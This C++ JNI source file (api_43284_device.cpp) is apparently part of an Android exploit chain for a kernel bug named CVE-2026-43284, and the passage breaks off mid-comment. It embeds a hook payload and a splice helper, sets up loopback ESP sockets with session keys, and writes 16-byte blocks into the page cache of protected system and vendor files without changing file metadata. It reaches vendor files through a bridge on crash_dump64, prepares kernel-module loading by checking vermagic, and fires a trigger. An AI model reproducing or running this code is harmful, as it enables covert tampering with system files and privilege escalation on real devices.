/** @file jni/api_43284_device.cpp
 *  43284 的**数据性**设备缝：本构建自带的字节与钩子计划（不需要设备就能算出来的那部分）。
 *
 *  它们与旧的帧实现（ops_43284_device.cpp）用的是同一批来源：embed 的两张图与 hook 的 sentry 计划，
 *  所以真机上的摘要/数字必须与旧路径逐位一致 —— 门禁正是拿 manifest 里的值对拍。
 *
 *  其余缝（resolve / write_block / read_block / module_check / trigger / wait_terminal）属于真正的
 *  设备工作（J7.5 的 43284 链），不在这里。
 */
#include "backend/cve_2026_43284/landing/crash_dump_bridge.hpp"
#include "jni/gl_log.hpp"
#include "backend/cve_2026_43284/kernel_access.hpp"
#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
#include "backend/cve_2026_43284/landing/real_splice_io.hpp"
#include <cstring>
#include <sys/stat.h>
#include <cstddef>
#include <cstdint>
#include <span>
#include <arpa/inet.h>
#include <fcntl.h>
#include <memory>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string>

#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"
#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
#include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/lkm/module_facts.hpp"
#include "jni/api_43284.hpp"

namespace ghostlock::jni {
    namespace {

    /**
     *  PathView 是「借用式 ptr + len」，而 half_set() 的定义是 (bytes == nullptr) != (length == 0)：
     *  **非空指针 + 长度 0 也算半给**（access_params.hpp:60-62）。所以空路径必须写成 {nullptr, 0}。
     */
    backend::cve_2026_43284::PathView access_path_of(const std::string &text) noexcept {
        return text.empty() ? backend::cve_2026_43284::PathView{nullptr, 0U}
                            : backend::cve_2026_43284::PathView{text.data(), text.size()};
    }
    /** 已开的门：一个 slot 一个 fd。token = slot + 1（0 留给"没有门"）。 */
    struct OpenDoor final {
        int fd = -1;
        std::string path{};
    };
    constexpr std::size_t kMaxDoors = 8U;
    OpenDoor g_doors[kMaxDoors] = {};
        /** 载荷的落点；缝返回的 span 必须在调用期间有效。 */
        std::uint8_t g_payload[1024] = {};
        std::size_t g_payload_size = 0U;

        bool device_embedded_image(const std::int32_t role, std::span<const std::byte> &image,
                                 void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            if (role == kImageSpliceHelper) {
                const auto *bytes = embed::splicehelper_bytes();
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(bytes),
                                                   embed::splicehelper_padded_size());
                return true;
            }
            if (role == kImageLandingPayload) {
                const hook::SentryPlan plan = hook::device_sentry_plan();
                std::size_t size = 0U;
                if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                    hook::SentryError::Ok) {
                    return false;
                }
                g_payload_size = size;
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                   g_payload_size);
                return true;
            }
            return false;
        }

        bool device_hook_plan(const Init43284Values &, const HookPlanRequest43284Values &,
                            std::uint64_t &branch_word, std::uint64_t &displaced_word,
                            std::uint64_t &site_offset, std::uint64_t &landing_offset,
                            std::span<const std::byte> &payload, void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            const hook::SentryPlan plan = hook::device_sentry_plan();
            std::uint32_t branch = 0U;
            if (hook::hook_branch(plan, branch) != hook::SentryError::Ok) {
                return false;
            }
            std::size_t size = 0U;
            if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                hook::SentryError::Ok) {
                return false;
            }
            g_payload_size = size;
            branch_word = branch;
            displaced_word = plan.displaced_instruction;
            site_offset = plan.hook_file_offset;
            landing_offset = plan.payload_file_offset;
            payload = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                 g_payload_size);
            return true;
        }
        /**
         *  按会话的落地装配：门 → 双门对象 → 拼接面 → 窗口 → 落地。
         *
         *  @note RealSpliceIo 与 PageCacheWrite 都不可拷贝，所以整包挂堆上（unique_ptr），与门表同生命周期；
         *        resolve 每次先销毁旧的再建新的。会话真正结束时的销毁需要收尾钩子 —— 当前 API 没有，登记为债。
         */
        struct Landing43284 final {
            backend::cve_2026_43284::landing::PageCacheDoorLinux door;
            backend::cve_2026_43284::landing::RealSpliceIo io;
            backend::cve_2026_43284::landing::PageCacheWrite window;
            backend::cve_2026_43284::landing::PageCacheLanding landing;
            bool up = false;

            /** @param path 载体路径（Kotlin 给） @param sa 会话凭据（Kotlin 给） */
            Landing43284(const char *path, const std::size_t length,
                         const backend::cve_2026_43284::SaMaterial &sa) noexcept
                : door(path, length),
                  io(backend::cve_2026_43284::landing::real_splice_io(), door.open_target()),
                  window(door, io),
                  landing(window) {
                up = door.usable() && landing.bring_up_with(sa);
            }
        };
        std::unique_ptr<Landing43284> g_session;
        /** 设备工作：这个路径现在存在吗。 */
        bool path_exists(const char *path) noexcept {
            struct stat info {};
            return path != nullptr && ::stat(path, &info) == 0;
        }
        /** 设备工作：睡一个轮询间隔。 */
        void sleep_ms(const std::uint32_t ms) noexcept {
            ::usleep(static_cast<useconds_t>(ms) * 1000U);
        }
    }  // namespace

    /**
     *  模块校验：从镜像字节里读出事实，再按内核自己的规则比对 vermagic。纯计算，不需要设备权限，
     *  这正是它能先接线的原因；失败由上层给具名拒绝（module-check-refused）。
     */
    bool device_module_check(const Init43284Values &, const ModuleCheck43284Values &request,
                             void *) noexcept {
        using namespace ghostlock::backend::cve_2026_43284;
        const lkm::ModuleFacts facts =
            lkm::read_module_facts(request.moduleImage.data(), request.moduleImage.size());
        if (!facts.elf_valid || !facts.has_vermagic || facts.vermagic[0] == '\0') {
            /* 不是内核能接受的模块（错 ELF / 没 .modinfo / 没 vermagic）：具名交给上层。 */
            return false;
        }
        const std::string kernel(reinterpret_cast<const char *>(request.kernelVermagic.data()),
                                 request.kernelVermagic.size());
        return lkm::vermagic_matches_kernel(facts.vermagic, kernel.c_str(), facts.has_crcs);
    }

    /**
     *  等终态：在 <moduleName> 指向的文件里找三种 marker 之一，预算内按 pollMs 轮询。
     *
     *  三态都是**真实答案**，不是猜的：找到 successMarker ⇒ success；找到 failureMarker ⇒ failure；
     *  文件不在、或只有 inFlightMarker、或预算用尽 ⇒ inflight。上层据此给 Ok / Failed / InFlight。
     */
    /**
     *  等终态：**复用** steps 里那个实现（wait_for_module），由 native 只提供两件设备工作：
     *  exists 用 stat、sleep_ms 用 usleep。
     *
     *  具名原因到三态的对应（照实现读出来的，不是猜的）：
     *  - nullptr ⇒ Success；
     *  - failure-marker / module-gone ⇒ Failure；
     *  - timeout-while-running（预算用尽仍在跑）⇒ **InFlight**（既非成功也非失败）；
     *  - 时钟没接（no clock）⇒ 也算 Failure —— 那是接线错误，不该发生。
     */
    bool device_wait_terminal(const Init43284Values &, const Wait43284Values &request,
                              TerminalState &terminal, void *) noexcept {
        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
        };
        const std::string success = text_of(request.successMarker);
        const std::string failure = text_of(request.failureMarker);
        const std::string in_flight = text_of(request.inFlightMarker);
        const std::string module_name = text_of(request.moduleName);
        backend::cve_2026_43284::steps::WaitRequest wait{};
        wait.success_marker = success.c_str();
        wait.failure_marker = failure.c_str();
        wait.in_flight_marker = in_flight.c_str();
        wait.module_name = module_name.c_str();
        wait.budget_ms = static_cast<std::uint32_t>(request.budgetMs);
        wait.poll_ms = static_cast<std::uint32_t>(request.pollMs > 0 ? request.pollMs : 10);
        wait.exists = &path_exists;
        wait.sleep_ms = &sleep_ms;
        const char *const reason = backend::cve_2026_43284::steps::wait_for_module(wait);
        if (reason == nullptr) {
            terminal = TerminalState::Success;
            return true;
        }
        terminal = std::strcmp(reason, "step-wait-timeout") == 0 ? TerminalState::InFlight
                                                                   : TerminalState::Failure;
        return true;
    }

    bool device_trigger(const Init43284Values &, const Trigger43284Values &request, void *) noexcept {
        const char *const who = ghostlock::backend::cve_2026_43284::steps::trigger_orphan(
            static_cast<std::uint32_t>(request.delayMs));
        return who == nullptr;
    }

    /**
     *  读回一块：从门那扇 fd 上 pread 十六字节（设备工作）。
     *
     *  @return 读到十六字节为 true；门没开、偏移越界、短读都是 false（上层给 block-read-refused）。
     *  @note 这一半只读**盘上现存的内容**：写还没接线（ESP 路线），所以内容不会等于最近一次写，
     *        状态机因此不会走到 Applied —— 这是如实的，不是缺陷。
     */
    /**
     *  写一块：走落地对象的 land_block（ESP 路线）；成功只到 Dispatched，并把序号往前推。
     *
     *  @return 落地对象不可用、门不对、或 land_block 拒绝时为 false（上层给 block-refused）。
     */
    bool device_write_block(const Init43284Values &, const WriteBlock43284Values &request,
                            const std::uint64_t door_token, std::uint64_t &sequence,
                            void *) noexcept {
        {
            const std::size_t who = (door_token == 0U) ? 0U : static_cast<std::size_t>(door_token) - 1U;
            const char *const target = (who < kMaxDoors) ? g_doors[who].path.c_str() : "(no-door)";
            GL_LOGI("write_block enter target=%s session=%d up=%d bytes=%zu offset=%llu", target,
                    (g_session != nullptr) ? 1 : 0,
                    ((g_session != nullptr) && g_session->up) ? 1 : 0,
                    request.block.size(), static_cast<unsigned long long>(request.offset));
        }
        if (g_session == nullptr || !g_session->up || request.block.size() != 16U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
        if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
            return false;
        }
        if (!g_session->landing.land_block(static_cast<std::uint64_t>(request.offset),
                                          request.block.data())) {
            return false;
        }
        sequence += 1U;
        g_session->landing.adopt_sequence(static_cast<std::uint32_t>(sequence));
        return true;
    }

    bool device_read_block(const Init43284Values &, const ReadBlock43284Values &request,
                           const std::uint64_t door_token, const std::span<std::byte> out,
                           void *) noexcept {
        const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
        if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
            return false;
        }
        const ssize_t got = ::pread(g_doors[slot].fd, out.data(), out.size(),
                                    static_cast<off_t>(request.offset));
        return got == static_cast<ssize_t>(out.size());
    }

    backend::cve_2026_43284::SaMaterial sa_material_of(const Init43284Values &params) noexcept {
        backend::cve_2026_43284::SaMaterial sa{};
        sa.spi = static_cast<std::uint32_t>(params.spi);
        sa.encap_port = static_cast<std::uint16_t>(params.encapPort);
        sa.sender_port = static_cast<std::uint16_t>(params.senderPort);
        sa.icv_len = static_cast<std::uint8_t>(params.icvLength);
        bool any_key_byte = false;
        for (std::size_t index = 0U; index < 32U; ++index) {
            sa.aes_key[index] = params.aesKey.data()[index];
            sa.hmac_key[index] = params.hmacKey.data()[index];
            any_key_byte = any_key_byte || sa.aes_key[index] != 0U || sa.hmac_key[index] != 0U;
        }
        /* 全零密钥不是凭据（与 access_params.hpp 同一条规则）：没有材料，门就不开。 */
        sa.set = any_key_byte;
        return sa;
    }


    /** 关掉一个 slot 上的门（复用 slot 或替换目标时先关）。 */
    void close_door(OpenDoor &door) noexcept {
        if (door.fd >= 0) {
            static_cast<void>(::close(door.fd));
            door.fd = -1;
        }
        door.path.clear();
    }

    /**
     *  开一扇门：以 O_RDWR 打开目标文件，并把 fd 的 slot 编号当 token 交出去。
     *
     *  这是门的第一半（能打开、能读写）；真正让写入"不改文件元数据地落进页缓存"的那一半是 ESP 路线
     *  （write_block / read_block 接 landing 的 land_block/read_block），还没接线 —— 所以现在
     *  写仍然是 block-refused，而不是"看起来写成功了"。
     */
    bool device_resolve(const Init43284Values &params_argv, const ResolveTarget43284Values &request,
                        std::uint64_t &token, void *) noexcept {
        const std::string path(reinterpret_cast<const char *>(request.path.data()), request.path.size());
        if (path.empty()) {
            return false;
        }
        /* 只读打开：写不经过这个 fd —— 写是经 ESP 报文 + splice 落进页缓存，目标只需读权限；用 O_RDWR 对系统文件会 EACCES（2026-10-15 真机实证）。 */
        const int fd = ::open(path.c_str(), O_RDONLY | O_CLOEXEC);
        /* 供应商载体（/vendor/…）对本进程 EACCES：**不再直接失败** —— 记下这门是"未打开/远端"（fd 保持 -1），
         * 由落地（surface）用 patch #1 写下的 helper 桥去读它、拼接它（2026-10-15，照 tools/pagecache_load_lkm 的配方）。 */
        const int open_errno = errno;
        const bool remote = (fd < 0) && (open_errno == EACCES || open_errno == EPERM);
        if (fd < 0 && !remote) {
            return false;
        }
        if (remote) {
            GL_LOGI("resolve: %s exists but this process cannot open it (errno=%d) -> remote",
                    path.c_str(), open_errno);
        }
        for (std::size_t index = 0U; index < kMaxDoors; ++index) {
            if (g_doors[index].fd < 0 && g_doors[index].path.empty()) {
                g_doors[index].fd = fd;              /* remote 时为 -1：占着槽但没开 */
                g_doors[index].path = path;
                token = index + 1U;
                /* 门开了就把落地装配建起来：载体路径来自请求，凭据来自会话参数。 */
                g_session.reset();
                g_session = std::make_unique<Landing43284>(
                    path.c_str(), path.size(), sa_material_of(params_argv));
                return true;
            }
        }
        if (fd >= 0) {
            static_cast<void>(::close(fd));
        }
        return false;
    }

    /** 本构建能提供的 43284 缝（其余留空 ⇒ 那些函数以 op-not-wired 具名拒绝）。 */
    DeviceOps43284 device_ops_43284() noexcept {
        DeviceOps43284 ops{};
        ops.embedded_image = &device_embedded_image;
        ops.hook_plan = &device_hook_plan;
        ops.resolve = &device_resolve;
        ops.module_check = &device_module_check;
        ops.read_block = &device_read_block;
        ops.write_block = &device_write_block;
        ops.trigger = &device_trigger;
        ops.wait_terminal = &device_wait_terminal;
        return ops;
    }
    /**
     *  关掉一扇门：按 id 关掉门表里的 fd 并清记录（设备工作；谁开谁关那条规则的执行者）。
     *
     *  @param targetId 由 resolve 给的句柄；0、越界、或本来没开 ⇒ false（上层给 stale-target）。
     *  @note 定义在命名空间层（与头文件声明同层），否则会变成内部链接、Android 链接期找不到。
     */
    bool device_close_target(const std::uint64_t targetId) noexcept {
        if (targetId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(targetId) - 1U;
        if (slot >= kMaxDoors || g_doors[slot].fd < 0) {
            return false;
        }
        static_cast<void>(::close(g_doors[slot].fd));
        g_doors[slot].fd = -1;
        g_doors[slot].path.clear();
        return true;
    }

    /**
     *  建 ESP socket：发送端绑 sa.sender_port，连到 sa.encap_port（对端是内核里那条被劫持的路由）。
     *
     *  设备工作（socket/bind/connect）；端口与密钥由会话参数给，本函数不做任何决策。
     *  @return socket fd；失败：-1 没有材料、-2 socket、-3 bind、-4 connect（具名给上层）。
     *  @note 照抄 landing/pagecache_door_linux.cpp 的写法：**非限定**的 sockaddr_in/htons/htonl ——
     *        本 TU 里有 using namespace ghostlock::backend::cve_2026_43284;，带 :: 的限定形式在这里解析失败。
     *        另：SOCK_CLOEXEC 是 Linux 专有，跨平台只用 SOCK_DGRAM。
     */
    int device_connect_esp(const Init43284Values &params) noexcept {
        const backend::cve_2026_43284::SaMaterial sa = sa_material_of(params);
        if (!sa.set) {
            return -1;  /* 没有材料：密钥全零 */
        }
        const int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) {
            return -2;  /* socket 建不出来 */
        }
        sockaddr_in local{};
        GL_LOGI("esp: socket fd=%d sender_port=%u encap_port=%u", fd,
                static_cast<unsigned>(sa.sender_port), static_cast<unsigned>(sa.encap_port));
        local.sin_family = AF_INET;
        local.sin_port = htons(sa.sender_port);
        local.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (bind(fd, reinterpret_cast<sockaddr *>(&local), sizeof(local)) != 0) {
            static_cast<void>(close(fd));
            return -3;  /* bind 失败（端口被占/无权限） */
        }
        sockaddr_in peer{};
        peer.sin_family = AF_INET;
        peer.sin_port = htons(sa.encap_port);
        peer.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        /* Which local port did the bind actually take? The SA only matches packets that arrive on
         * the port it registered, so this is the field to compare with encapPort. */
        {
            sockaddr_in bound{};
            socklen_t bound_len = sizeof(bound);
            if (::getsockname(fd, reinterpret_cast<sockaddr *>(&bound), &bound_len) == 0) {
                GL_LOGI("esp: socket local_port=%u (the port the SA must be told)",
                        static_cast<unsigned>(ntohs(bound.sin_port)));
            }
        }
        GL_LOGI("esp: bind(local) ok, connecting to peer port=%u",
                static_cast<unsigned>(sa.encap_port));
        if (connect(fd, reinterpret_cast<sockaddr *>(&peer), sizeof(peer)) != 0) {
            static_cast<void>(close(fd));
            return -4;  /* connect 失败 */
        }
        {
            sockaddr_in got{};
            socklen_t got_len = sizeof(got);
            if (getsockname(fd, reinterpret_cast<sockaddr *>(&got), &got_len) == 0) {
                GL_LOGI("esp: ready local_port=%u peer_port=%u (both loopback)",
                        static_cast<unsigned>(ntohs(got.sin_port)), static_cast<unsigned>(sa.encap_port));
            }
        }
        return fd;
    }

    /** @return 关掉一个 socket；fd < 0 则为 false。 */
    bool device_close_socket(const int fd) noexcept {
        if (fd < 0) {
            return false;
        }
        return close(fd) == 0;
    }

    /**
     *  socket 表：connectEsp/espSocketId 建出来的 fd 在这里按不透明 id 存着（谁建谁拆）。
     *
     *  id = slot + 1；0 恒表示没有。
     */
    constexpr std::size_t kMaxSockets = 8U;
    int g_sockets[kMaxSockets] = {-1, -1, -1, -1, -1, -1, -1, -1};

    /**
     *  薄门：只把两个**已经建好**的 fd 交出去（自己不拥有，谁建谁关）。
     *
     *  参考装配里的门（PageCacheDoorLinux）自己开 fd、自己建 socket；这里 fd 与 socket 已经分别由
     *  resolve 与 espSocketId 建好，所以只需一个交出两者的薄对象 —— 拼装顺序由 Kotlin 决定。
     */
    class PairedDoor final : public backend::cve_2026_43284::landing::DoorOps {
      public:
        PairedDoor(const int file_fd, const int socket_fd, const bool remote = false) noexcept
            : file_fd_(file_fd), socket_fd_(socket_fd), remote_(remote) {}

        [[nodiscard]] int open_target() noexcept override { return file_fd_; }
        [[nodiscard]] int connect_esp(const backend::cve_2026_43284::SaMaterial &) noexcept override {
            return socket_fd_;  /* 已经连好了，这里只交出去 */
        }
        void close_fd(const int) noexcept override { /* 不拥有 fd：由 closeTarget/closeSocket 关 */ }
        [[nodiscard]] bool target_is_remote() const noexcept override { return remote_; }

      private:
        int file_fd_ = -1;
        /** 载体是本进程打不开的 vendor 文件：没有 fd 不是失败（桥负责读写）。 */
        bool remote_ = false;
        int socket_fd_ = -1;
    };

    /** 一个拼接面：薄门 + 真拼接面（写路径的 I/O）。 */
    struct Surface final {
        std::unique_ptr<PairedDoor> door;
        std::unique_ptr<backend::cve_2026_43284::landing::RealSpliceIo> io;
        std::unique_ptr<backend::cve_2026_43284::landing::PageCacheWrite> window;
        /* 载体打不开时走 helper 桥：桥、远程门、以及窗口用的 DoorOps 引用（2026-10-15：vendor 载体对本进程 EACCES）。 */
        std::unique_ptr<backend::cve_2026_43284::landing::CrashDumpBridge> bridge;
        std::unique_ptr<backend::cve_2026_43284::landing::PageCacheDoorLinux> linux_door;
        std::unique_ptr<backend::cve_2026_43284::landing::RemoteDoor> remote;
        backend::cve_2026_43284::landing::DoorOps *doors_ops = nullptr;
        bool target_remote = false;
    };
    constexpr std::size_t kMaxSurfaces = 4U;
    std::unique_ptr<Surface> g_surfaces[kMaxSurfaces];
    std::unique_ptr<backend::cve_2026_43284::landing::PageCacheLanding> g_landings[kMaxSurfaces];

    /**
     *  建 ESP socket 并存表（设备工作：socket/bind/connect）。
     *
     *  @return 不透明 id（slot + 1）；失败 0。端口由会话参数给，本函数不做决策。
     */
    std::uint64_t device_esp_socket_id(const Init43284Values &params, int &why) noexcept {
        why = 0;
        const int fd = device_connect_esp(params);
        if (fd < 0) {
            why = fd;  /* 把失败原因原样带出去：-1 没有材料、-2 socket、-3 bind、-4 connect */
            return 0U;
        }
        for (std::size_t index = 0U; index < kMaxSockets; ++index) {
            if (g_sockets[index] < 0) {
                g_sockets[index] = fd;
                return static_cast<std::uint64_t>(index) + 1U;
            }
        }
        static_cast<void>(device_close_socket(fd));
        why = -9;  /* 表满 */
        return 0U;
    }

    /** @return 同上，但不带失败原因。 */
    std::uint64_t device_esp_socket_id(const Init43284Values &params) noexcept {
        int why = 0;
        return device_esp_socket_id(params, why);
    }

    /** @return 按 id 关掉 socket；0/越界/未开 ⇒ false。 */
    bool device_close_socket_id(const std::uint64_t socketId) noexcept {
        if (socketId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(socketId) - 1U;
        if (slot >= kMaxSockets || g_sockets[slot] < 0) {
            return false;
        }
        const bool closed = device_close_socket(g_sockets[slot]);
        g_sockets[slot] = -1;
        return closed;
    }

    /**
     *  建一个拼接面：把门表里的 fd 与 socket 表里的 socket 配成一个薄门，再包上真拼接面。
     *
     *  @return 不透明 id（slot + 1）；失败 0。
     */
    std::uint64_t device_make_surface(const std::uint64_t targetId,
                                      const std::uint64_t socketId) noexcept {
        if (targetId == 0U || socketId == 0U) {
            return 0U;
        }
        /*
         * targetId 是**票据**（(门句柄 << 32) | 代）：门句柄 = slot + 1，所以下标是 (targetId >> 32) - 1。
         * 这是 2026-10-15 真机 surface-refused 的真因 —— 早先把它当成 slot + 1 直接减一，解出来的下标是错的。
         */
        const std::size_t target_slot = static_cast<std::size_t>(targetId >> 32U) - 1U;
        const std::size_t socket_slot = static_cast<std::size_t>(socketId) - 1U;
        if (target_slot >= kMaxDoors || (g_doors[target_slot].fd < 0 && g_doors[target_slot].path.empty())) {
            return 0U;
        }
        if (socket_slot >= kMaxSockets || g_sockets[socket_slot] < 0) {
            return 0U;
        }
        for (std::size_t index = 0U; index < kMaxSurfaces; ++index) {
            if (g_surfaces[index] == nullptr) {
                auto surface = std::make_unique<Surface>();
                surface->door = std::make_unique<PairedDoor>(g_doors[target_slot].fd, g_sockets[socket_slot]);
                const bool remote = g_doors[target_slot].fd < 0;
                if (remote) {
                    /* 载体是本进程打不开的 vendor 文件：读与写都经 patch #1 写下的 helper（桥）。 */
                    const std::string &carrier = g_doors[target_slot].path;
                    const char *helper_path = "/apex/com.android.runtime/bin/crash_dump64";
                    /* 远端门用**带标志的 PairedDoor**：它交出的正是已连好的那条套接字，
                     * 不会像 PageCacheDoorLinux 那样再自建一条（那会与同一 SA 的端口冲突 ⇒ EADDRINUSE ⇒ open 失败）。 */
                    surface->door = std::make_unique<PairedDoor>(-1, g_sockets[socket_slot], true);
                    auto bridge = std::make_unique<backend::cve_2026_43284::landing::CrashDumpBridge>();
                    if (!bridge->bind(helper_path, std::strlen(helper_path), carrier.c_str(), carrier.size())) {
                        GL_LOGI("surface: bridge refused helper=%s carrier=%s", helper_path, carrier.c_str());
                        return 0U;
                    }

                    surface->io = std::make_unique<backend::cve_2026_43284::landing::RealSpliceIo>(
                        backend::cve_2026_43284::landing::real_splice_io(), -1, 0,
                        bridge->old_page(), bridge->helper());
                    surface->doors_ops = surface->door.get();
                    surface->target_remote = true;
                    surface->bridge = std::move(bridge);
                    GL_LOGI("surface: slot=%zu carrier is remote (%s) -> the bridge reads and splices it",
                            index, carrier.c_str());
                } else {
                    surface->io = std::make_unique<backend::cve_2026_43284::landing::RealSpliceIo>(
                        backend::cve_2026_43284::landing::real_splice_io(), g_doors[target_slot].fd);
                    surface->doors_ops = surface->door.get();
                }
                g_surfaces[index] = std::move(surface);
                return static_cast<std::uint64_t>(index) + 1U;
            }
        }
        return 0U;
    }

    /** @return 拆掉一个拼接面（同时拆掉它的落地对象，如果有）。 */
    bool device_destroy_surface(const std::uint64_t surfaceId) noexcept {
        if (surfaceId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(surfaceId) - 1U;
        if (slot >= kMaxSurfaces || g_surfaces[slot] == nullptr) {
            return false;
        }
        g_landings[slot].reset();
        g_surfaces[slot].reset();
        return true;
    }

    /**
     *  按拼接面建落地对象（借它的窗口）。
     *
     *  @return 不透明 id（slot + 1）；没有拼接面或已建过 ⇒ 0。
     */
    std::uint64_t device_make_landing(const std::uint64_t surfaceId) noexcept {
        if (surfaceId == 0U) {
            return 0U;
        }
        const std::size_t slot = static_cast<std::size_t>(surfaceId) - 1U;
        if (slot >= kMaxSurfaces || g_surfaces[slot] == nullptr || g_landings[slot] != nullptr) {
            return 0U;
        }
        auto window = std::make_unique<backend::cve_2026_43284::landing::PageCacheWrite>(
            *g_surfaces[slot]->doors_ops, *g_surfaces[slot]->io);
        GL_LOGI("landing: built slot=%zu (window over this surface)", slot);
        /* 窗口必须比落地对象活得久：把窗口也挂在 surface 上。 */
        g_surfaces[slot]->window = std::move(window);
        g_landings[slot] = std::make_unique<backend::cve_2026_43284::landing::PageCacheLanding>(
            *g_surfaces[slot]->window);
        return static_cast<std::uint64_t>(slot) + 1U;
    }

    /** @return 拆掉落地对象；没有则为 false。 */
    bool device_destroy_landing(const std::uint64_t landingId) noexcept {
        if (landingId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        g_landings[slot].reset();
        return true;
    }

    /**
     *  用会话参数的材料把落地对象拉起来（bring_up_with）。参数（密钥/端口/ICV）由 Kotlin 给。
     *
     *  @return 起来了 true；id 无效、没建过、或材料不全 ⇒ false。
     */
    bool device_bring_up(const std::uint64_t landingId, const Init43284Values &params) noexcept {
        if (landingId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        const backend::cve_2026_43284::SaMaterial material = sa_material_of(params);
        const bool landing_up = g_landings[slot]->bring_up_with(material);
        GL_LOGI("landing: bring_up slot=%zu up=%d sa_set=%d spi=0x%08x encap=%u sender=%u icv=%u",
                slot, landing_up ? 1 : 0, material.set ? 1 : 0, material.spi,
                static_cast<unsigned>(material.encap_port), static_cast<unsigned>(material.sender_port),
                static_cast<unsigned>(material.icv_len));
        return landing_up;
    }

    /** @return 窗口的下一个序号；id 无效 ⇒ 0。序号策略（用不用、用哪个）由 Kotlin 决定。 */
    std::uint64_t device_next_sequence(const std::uint64_t landingId) noexcept {
        if (landingId == 0U) {
            return 0U;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_surfaces[slot] == nullptr || g_surfaces[slot]->window == nullptr) {
            return 0U;
        }
        return static_cast<std::uint64_t>(g_surfaces[slot]->window->next_seq());
    }

    /** 让落地对象采用下一个序号（跨窗口接续也走这里）。 */
    bool device_adopt_sequence(const std::uint64_t landingId, const std::uint64_t next) noexcept {
        if (landingId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        g_landings[slot]->adopt_sequence(static_cast<std::uint32_t>(next));
        return true;
    }

    /**
     *  往落地对象写一块（十六字节）：ESP 路线的写入口。
     *
     *  @return 写成功 true（只到 Dispatched；内容是否真落上由随后 read_block 比较判定）。
     */
    bool device_land_block(const std::uint64_t landingId, const std::uint64_t offset,
                           const std::uint8_t *block) noexcept {
        if (landingId == 0U || block == nullptr) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        return g_landings[slot]->land_block(offset, block);
    }

    /**
     *  从落地对象读回一块（十六字节）：走同一个窗口的读路径，与写回的原文比较用。
     *
     *  @return 整读成功 true。
     */
    bool device_read_landing_block(const std::uint64_t landingId, const std::uint64_t offset,
                                   std::uint8_t *out) noexcept {
        if (landingId == 0U || out == nullptr) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return false;
        }
        return g_landings[slot]->read_block(offset, out);
    }

    /** Access 表：按拼接面/落地对象建出来的 Access 在这里按不透明 id 存着（谁建谁拆）。 */
    constexpr std::size_t kMaxAccesses = 4U;
    std::unique_ptr<backend::cve_2026_43284::Access> g_accesses[kMaxAccesses];
    /* access 槽 -> 落地槽（1 起；0 = 未记）：写失败时要回到拼接面问 last_error()。 */
    std::size_t g_access_landing[kMaxAccesses] = {};

    /**
     *  建一个 Access：它借用落地对象（必须比它活得久）。
     *
     *  @return 不透明 id（slot + 1）；没有落地对象或表满 ⇒ 0。
     */
    std::uint64_t device_make_access(const std::uint64_t landingId) noexcept {
        if (landingId == 0U) {
            return 0U;
        }
        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
            return 0U;
        }
        for (std::size_t index = 0U; index < kMaxAccesses; ++index) {
            if (g_accesses[index] == nullptr) {
                g_accesses[index] = std::make_unique<backend::cve_2026_43284::Access>(g_landings[slot].get());
                g_access_landing[index] = slot + 1U;
                GL_LOGI("access: created index=%zu landingSlot=%zu", index, slot);
                return static_cast<std::uint64_t>(index) + 1U;
            }
        }
        return 0U;
    }

    /** @return 拆掉一个 Access（它只借用落地对象，所以拆它不动别人）。 */
    bool device_destroy_access(const std::uint64_t accessId) noexcept {
        if (accessId == 0U) {
            return -1;  /* 没有句柄 */
        }
        const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
        if (slot >= kMaxAccesses || g_accesses[slot] == nullptr) {
            return -2;  /* 句柄失效 */
        }
        g_accesses[slot].reset();
        g_access_landing[slot] = 0U;
        return true;
    }

    /**
     *  初始化 Access（驱动器里 patch_access.initialize(params) 的那一步）。
     *
     *  @note 生成的 Values 在 contract 子命名空间里；PathView 是借用式，三个路径的 std::string 必须活到调用结束，
     *        所以它们都在本栈帧里。
